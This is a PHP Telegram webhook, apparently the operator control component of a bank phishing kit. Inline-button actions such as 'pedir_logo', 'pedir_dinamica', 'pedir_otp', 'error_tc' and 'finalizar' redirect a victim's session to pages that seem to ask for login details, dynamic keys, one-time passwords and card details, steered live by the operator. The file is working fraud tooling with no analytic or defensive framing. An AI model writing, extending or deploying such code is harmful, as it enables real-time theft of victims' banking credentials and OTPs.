<?php
// webhook.php

// Cargar configuración
$config = require __DIR__ . '/config.php';

// Obtener la actualización de Telegram
$update = json_decode(file_get_contents('php://input'), true);

// Base URL del app (configurable en APP_URL o calculada dinámicamente)
$baseUrl = rtrim($config['app_url'] ?? '', '/');
if (empty($baseUrl) && !empty($_SERVER['HTTP_HOST'])) {
    $scheme = 'https';
    if (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') {
        $scheme = 'https';
    } elseif (!empty($_SERVER['REQUEST_SCHEME'])) {
        $scheme = $_SERVER['REQUEST_SCHEME'];
    } elseif (!empty($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 80) {
        $scheme = 'http';
    }
    $baseUrl = $scheme . '://' . $_SERVER['HTTP_HOST'];
}

$baseUrl = rtrim($baseUrl, '/');

// Verificar si es una callback query
if (isset($update['callback_query'])) {
    $callback_query = $update['callback_query'];
    $callback_data = explode(':', $callback_query['data']);
    $action = $callback_data[0] ?? '';
    $transaction_id = $callback_data[1] ?? '';

    // Iniciar sesión para almacenar el estado
    session_start();
    $_SESSION['current_transaction'] = $transaction_id;

    if (!isset($_SESSION['actions'])) {
        $_SESSION['actions'] = [];
    }

    $redirect_url = '';
    $action_urls = [
        'pedir_logo'      => $baseUrl . '/pedir_logo.php?transactionId=' . urlencode($transaction_id),
        'pedir_dinamica'  => $baseUrl . '/pedir_dinamica.php?transactionId=' . urlencode($transaction_id),
        'pedir_otp'       => $baseUrl . '/pedir_otp.php?transactionId=' . urlencode($transaction_id),
        'error_tc'        => $baseUrl . '/tarjeta.php?transactionId=' . urlencode($transaction_id),
        'error_logo'      => $baseUrl . '/error_logo.php?transactionId=' . urlencode($transaction_id),
        'confirm_finalizar' => $baseUrl . '/token.php?transactionId=' . urlencode($transaction_id),
        'finalizar'       => $baseUrl . '/token.php?transactionId=' . urlencode($transaction_id),
    ];

    switch ($action) {
        case 'pedir_logo':
            $_SESSION['actions'][$transaction_id] = 'logo';
            $redirect_url = $action_urls['pedir_logo'];
            break;
        case 'pedir_dinamica':
            $_SESSION['actions'][$transaction_id] = 'dinamica';
            $redirect_url = $action_urls['pedir_dinamica'];
            break;
        case 'pedir_otp':
            $_SESSION['actions'][$transaction_id] = 'otp';
            $redirect_url = $action_urls['pedir_otp'];
            break;
        case 'error_tc':
            $_SESSION['actions'][$transaction_id] = 'error_tc';
            $redirect_url = $action_urls['error_tc'];
            break;
        case 'error_logo':
            $_SESSION['actions'][$transaction_id] = 'error_logo';
            $redirect_url = $action_urls['error_logo'];
            break;
        case 'confirm_finalizar':
        case 'finalizar':
            $_SESSION['actions'][$transaction_id] = 'finalizado';
            $redirect_url = $action_urls['confirm_finalizar'];
            break;
        default:
            $redirect_url = '';
    }

    $response_data = [
        'callback_query_id' => $callback_query['id'],
        'text' => $redirect_url ? 'Redirigiendo al enlace...' : 'Acción procesada.',
        'show_alert' => false
    ];

    if ($redirect_url) {
        $response_data['url'] = $redirect_url;
        $_SESSION['redirect_url'] = $redirect_url;
    }

    $ch = curl_init("https://api.telegram.org/bot" . $config['bot_token'] . "/answerCallbackQuery");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($response_data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_exec($ch);
    curl_close($ch);
}

// Responder con OK
http_response_code(200);
echo "OK";
?>